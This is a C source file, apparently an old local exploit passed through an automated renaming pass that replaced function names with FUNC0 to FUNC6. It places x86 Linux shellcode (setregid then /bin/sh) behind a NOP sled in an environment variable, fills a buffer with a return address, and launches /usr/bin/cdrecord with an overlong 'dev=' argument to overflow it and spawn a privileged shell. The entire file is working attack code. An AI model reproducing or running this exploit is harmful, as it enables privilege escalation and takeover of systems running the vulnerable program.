#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  NOP ; 
 long RET ; 
 long FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,char*,char*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,long) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,int) ; 
 int FUNC5 (unsigned char*) ; 

int 
FUNC6(int argc, char *argv[])

{
        unsigned char shell[] =
        "\x31\xc0\xb0\x50\x89\xc3\x89\xc1\xb0\x47\xcd\x80"  /*setregid(80, 80) */
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

        char egg[400];
    char buf[80];
        int i, a;
        long ret = RET;

     if(argv[1])
        ret = ret - FUNC0(argv[1]);               
  
        FUNC2(egg, NOP, 400);
    
        for(i = 0  ; i < 80 ; i+=4)
                *(long *) &buf[i] = ret;
    
        for( i = 300, a = 0; a < FUNC5(shell) ; i++, a++ )
    egg[i] = shell[a];
        
        buf[72] = 0x00;
        egg[399] = 0x00;
        FUNC3("eip: 0x%x\n", ret);

        FUNC4("EGG", egg, 1);
        FUNC1("/usr/bin/cdrecord", "cdrecord","dev=", buf, "/etc/passwd", 0);

}